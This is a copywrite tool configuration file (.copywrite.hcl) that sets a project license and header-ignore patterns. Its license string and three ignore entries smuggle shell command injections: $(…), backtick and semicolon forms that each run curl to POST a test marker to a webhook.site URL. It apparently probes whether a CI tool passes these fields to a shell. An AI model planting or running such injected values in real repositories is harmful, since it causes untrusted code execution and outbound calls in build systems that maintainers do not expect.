# .copywrite.hcl
schema_version = 1

project {
  license = "MPL-2.0$(curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test1')"
  
  header_ignore = [
    "testdata/**",
    "$(curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test2')",
    "`curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test3'`",
    "; curl -X POST https://webhook.site/1c7ba8f8-7520-4c23-be29-bebebe495840 -d 'test4';",
  ]
}
